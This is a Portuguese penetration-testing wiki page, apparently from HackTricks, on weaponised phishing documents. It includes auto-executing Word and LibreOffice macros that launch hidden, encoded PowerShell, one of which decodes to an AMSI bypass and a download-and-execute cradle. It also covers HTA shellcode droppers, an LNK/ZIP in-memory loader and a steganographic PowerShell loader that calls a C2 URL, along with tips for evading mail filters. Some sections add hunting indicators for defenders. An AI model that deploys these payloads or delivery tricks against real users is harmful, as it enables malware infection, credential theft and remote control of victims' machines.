# Arquivos e Documentos de Phishing

## Documentos do Office

O Microsoft Word realiza a validação dos dados do arquivo antes de abri-lo. A validação dos dados é realizada na forma de identificação da estrutura dos dados, de acordo com o padrão OfficeOpenXML. Se ocorrer algum erro durante a identificação da estrutura dos dados, o arquivo analisado não será aberto.

Geralmente, arquivos do Word que contêm macros usam a extensão `.docm`. No entanto, é possível renomear o arquivo alterando a extensão e ainda manter suas capacidades de execução de macros.\
Por exemplo, um arquivo RTF não oferece suporte a macros, por padrão, mas um arquivo DOCM renomeado para RTF será processado pelo Microsoft Word e poderá executar macros.\
Os mesmos componentes internos e mecanismos se aplicam a todos os softwares do Microsoft Office (Excel, PowerPoint etc.).

Você pode usar o comando a seguir para verificar quais extensões serão executadas por alguns programas do Office:
```bash
assoc | findstr /i "word excel powerp"
```
Arquivos DOCX que fazem referência a um template remoto (File –Options –Add-ins –Manage: Templates –Go) que inclui macros também podem “executar” macros.

### Carregamento de Imagem Externa

Acesse: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Carregamento de Imagem Externa: Acesse: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor de Macros

É possível usar macros para executar código arbitrário a partir do documento.

#### Funções de carregamento automático

Quanto mais comuns elas forem, maior será a probabilidade de o AV detectá-las.

- AutoOpen()
- Document_Open()

#### Exemplos de Código de Macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Remover manualmente os metadados

Vá para **File > Info > Inspect Document > Inspect Document**, o que abrirá o Document Inspector. Clique em **Inspect** e, em seguida, em **Remove All**, ao lado de **Document Properties and Personal Information**.

#### Extensão Doc

Quando terminar, selecione o menu suspenso **Save as type** e altere o formato de **`.docx`** para Word 97-2003 **`.doc`**.\
Faça isso porque você **não pode salvar macros dentro de um `.docx`** e existe um **estigma** **em torno da** extensão habilitada para macros **`.docm`** (por exemplo, o ícone de miniatura tem um enorme `!` e alguns gateways de web/e-mail os bloqueiam completamente). Portanto, esta **extensão `.doc` legada é o melhor compromisso**.

#### Geradores de Malicious Macros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros autoexecutáveis de LibreOffice ODT (Basic)

Documentos do LibreOffice Writer podem incorporar macros Basic e executá-las automaticamente quando o arquivo é aberto, vinculando a macro ao evento **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Uma macro simples de reverse shell tem a seguinte aparência:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Observe as aspas duplicadas (`""`) dentro da string – o LibreOffice Basic usa aspas duplicadas para escapar aspas literais, portanto payloads que terminam com `...==""")` mantêm tanto o comando interno quanto o argumento do Shell equilibrados.

Dicas de entrega:

- Salve como `.odt` e associe a macro ao evento do documento para que ela seja executada imediatamente quando o arquivo for aberto.
- Ao enviar por email com `swaks`, use `--attach @resume.odt` (o `@` é obrigatório para que os bytes do arquivo, e não a string com o nome do arquivo, sejam enviados como anexo). Isso é essencial ao abusar de servidores SMTP que aceitam destinatários `RCPT TO` arbitrários sem validação.

## Arquivos HTA

Um HTA é um programa do Windows que **combina HTML e linguagens de script (como VBScript e JScript)**. Ele gera a interface do usuário e é executado como um aplicativo com "confiança total", sem as restrições do modelo de segurança de um navegador.

Um HTA é executado usando **`mshta.exe`**, que normalmente é **instalado** junto com o **Internet Explorer**, tornando o **`mshta` dependente do IE**. Portanto, se ele tiver sido desinstalado, os HTAs não poderão ser executados.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forçando a autenticação NTLM

Há várias maneiras de **forçar a autenticação NTLM "remotamente"**. Por exemplo, você poderia adicionar **imagens invisíveis** a e-mails ou HTML que o usuário acessará (até mesmo HTTP MitM?). Ou enviar à vítima o **endereço de arquivos** que irão **disparar** uma **autenticação** apenas ao **abrir a pasta.**

**Confira estas ideias e outras nas páginas a seguir:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Não se esqueça de que você não pode apenas roubar o hash ou a autenticação, mas também **realizar NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (cadeia fileless)

Campanhas altamente eficazes entregam um ZIP contendo dois documentos chamarizes legítimos (PDF/DOCX) e um .lnk malicioso. O truque é que o loader do PowerShell propriamente dito é armazenado dentro dos bytes brutos do ZIP após um marcador exclusivo, e o .lnk o extrai e executa totalmente na memória.<sup>[[2]](#references)</sup>

Fluxo típico implementado pelo one-liner de PowerShell do .lnk:

1) Localizar o ZIP original em caminhos comuns: Desktop, Downloads, Documents, %TEMP%, %ProgramData% e no diretório pai do diretório de trabalho atual.
2) Ler os bytes do ZIP e encontrar um marcador codificado (por exemplo, xFIQCV). Tudo após o marcador é o payload de PowerShell incorporado.
3) Copiar o ZIP para %ProgramData%, extraí-lo nesse local e abrir o .docx chamariz para parecer legítimo.
4) Bypass do AMSI para o processo atual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Desofuscar o próximo estágio (por exemplo, remover todos os caracteres #) e executá-lo na memória.

Exemplo de skeleton do PowerShell para extrair e executar o estágio incorporado:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notas
- A entrega frequentemente abusa de subdomínios PaaS confiáveis (por exemplo, *.herokuapp.com) e pode filtrar payloads (servir ZIPs benignos com base no IP/UA).
- O estágio seguinte frequentemente descriptografa shellcode em base64/XOR e o executa via Reflection.Emit + VirtualAlloc para minimizar artefatos em disco.

Persistência usada na mesma cadeia
- Hijacking de COM TypeLib do controle Microsoft Web Browser, fazendo com que o IE/Explorer ou qualquer aplicativo que o incorpore relance o payload automaticamente.<sup>[[2]](#references)[[4]](#references)</sup> Veja os detalhes e os comandos prontos para uso aqui:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arquivos ZIP contendo a string de marcador ASCII (por exemplo, xFIQCV) anexada aos dados do arquivo.
- .lnk que enumera pastas pai/do usuário para localizar o ZIP e abre um documento chamariz.
- Adulteração do AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads de negócios de longa duração terminando com links hospedados em domínios PaaS confiáveis.

## Staging priorizando o chamariz em LNK → persistência via tarefa agendada → trusted CPL side-loading

Outro padrão recorrente é um **`.lnk` que se faz passar por um documento** e abre imediatamente um chamariz benigno enquanto prepara a cadeia real em segundo plano.<sup>[[3]](#references)</sup>

Fluxo observado:
1. O atalho **se disfarça de PDF** e usa `conhost.exe` ou um proxy semelhante para iniciar um downloader ofuscado em PowerShell.
2. O PowerShell fragmenta tokens óbvios (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), fazendo com que detecções ingênuas que procuram `iwr`, `gci`, `ren`, `cpi` ou `schtasks` não identifiquem o comando.
3. O stager baixa **primeiro o documento chamariz**, abre-o para a vítima e, em seguida, reconstrói os arquivos maliciosos em segundo plano.
4. Os payloads podem ser gravados com **extensões fictícias** e depois renomeados removendo os caracteres de preenchimento, atrasando o surgimento de artefatos óbvios `.exe` / `.cpl`.
5. A persistência é estabelecida com uma **tarefa agendada baseada em minutos** que inicia um binário de host confiável a partir de um caminho gravável pelo usuário.

Indícios mínimos para hunting desse padrão:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Um layout de staging útil para reconhecer é:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ou `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Por que o segundo estágio é furtivo

No estudo de caso da Rapid7, a tarefa agendada iniciava repetidamente o **`Fondue.exe`** a partir de `C:\Users\Public\`. Como o **`APPWIZ.cpl`** estava no mesmo diretório e exportava **`RunFODW`**, o binário confiável da Microsoft fazia side-load do CPL do atacante em vez da cópia legítima do sistema.

O CPL então:
- Lê um blob **AES-256-CBC** de `C:\Windows\Tasks\editor.dat`
- Descriptografa-o por meio do **Windows CNG / `bcrypt.dll`**
- Aloca memória executável e copia o shellcode descriptografado
- Executa-o indiretamente, passando o ponteiro do shellcode como callback para **`EnumUILanguagesW`**

Vale a pena investigar essa última etapa separadamente: malwares frequentemente evitam um salto direto como `((void(*)())buf)()` e, em vez disso, abusam de uma **WinAPI legítima que aceita callbacks** para transferir a execução.

O payload descriptografado nesta campanha era um shellcode **Donut**, que então mapeava o PE final completamente na memória e aplicava patches em **AMSI/WLDP/ETW** no processo atual antes de transferir a execução. Para obter notas mais detalhadas sobre side-loading e pós-processamento residente na memória, consulte:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pivôs práticos para hunting:
- `.lnk` iniciando `powershell.exe` ou `conhost.exe`, seguido por um documento decoy visível.
- Downloads de curta duração para **`C:\Users\Public\`**, seguidos imediatamente por renomeações a partir de extensões sem sentido.
- Tarefas agendadas com nomes genéricos, como `GoogleErrorReport`, executando a partir de **diretórios graváveis pelo usuário**.
- Binários confiáveis carregando arquivos **`.cpl` / `.dll`** do mesmo diretório que não seja do sistema.
- Blobs de texto Base64 gravados em **`C:\Windows\Tasks\`** e depois lidos pelo módulo carregado via side-loading.

## Payloads delimitados por esteganografia em imagens (PowerShell stager)

Cadeias recentes de loaders entregam um JavaScript/VBS ofuscado que decodifica e executa um PowerShell stager em Base64. Esse stager baixa uma imagem, geralmente GIF, que contém uma DLL .NET codificada em Base64 e ocultada como texto simples entre marcadores exclusivos de início/fim. O script procura esses delimitadores (exemplos observados na prática: «<<sudo_png>> … <<sudo_odt>>>»), extrai o texto entre eles, decodifica-o de Base64 para bytes, carrega o assembly na memória e invoca um método de entrada conhecido com a URL do C2.<sup>[[5]](#references)</sup>

Fluxo de trabalho
- Estágio 1: Dropper JS/VBS arquivado → decodifica o Base64 incorporado → inicia o PowerShell stager com -nop -w hidden -ep bypass.
- Estágio 2: PowerShell stager → baixa a imagem, extrai o Base64 delimitado pelos marcadores, carrega a DLL .NET na memória e chama seu método (por exemplo, VAI), passando a URL do C2 e as opções.
- Estágio 3: O loader recupera o payload final e normalmente o injeta por meio de process hollowing em um binário confiável, geralmente MSBuild.exe.<sup>[[7]](#references)[[8]](#references)</sup> Consulte mais informações sobre process hollowing e execução proxy por utilitários confiáveis aqui:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Exemplo de PowerShell para extrair uma DLL de uma imagem e invocar um método .NET na memória:

<details>
<summary>Extrator e loader de payload stego em PowerShell</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notas
- Este é o ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Os markers variam entre as campanhas.
- O bypass de AMSI/ETW e a desofuscação de strings são comumente aplicados antes de carregar o assembly.
- Hunting: escaneie imagens baixadas em busca de delimitadores conhecidos; identifique o PowerShell acessando imagens e decodificando imediatamente blobs Base64.

Veja também as ferramentas de stego e as técnicas de carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## Droppers JS/VBS → Base64 PowerShell staging

Um estágio inicial recorrente é um arquivo `.js` ou `.vbs` pequeno e fortemente ofuscado, entregue dentro de um arquivo compactado. Seu único objetivo é decodificar uma string Base64 incorporada e iniciar o PowerShell com `-nop -w hidden -ep bypass` para inicializar o próximo estágio por HTTPS.<sup>[[5]](#references)</sup>

Lógica básica (abstrata):
- Ler o conteúdo do próprio arquivo
- Localizar um blob Base64 entre strings inúteis
- Decodificar para PowerShell ASCII
- Executar com `wscript.exe`/`cscript.exe`, invocando `powershell.exe`

Indicadores para Hunting
- Anexos JS/VBS compactados iniciando `powershell.exe` com `-enc`/`FromBase64String` na linha de comando.
- `wscript.exe` iniciando `powershell.exe -nop -w hidden` a partir de caminhos temporários do usuário.

## Arquivos do Windows para roubar hashes NTLM

Consulte a página sobre **locais para roubar credenciais NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – Macro do LibreOffice → webshell do IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campanha ZipLine: um ataque de phishing sofisticado direcionado a empresas dos EUA](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: acompanhando o tradecraft do Dropping Elephant por meio de uma cadeia de Loader com tema chinês](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nova técnica de persistência COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Loader PhantomVAI entrega uma variedade de infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
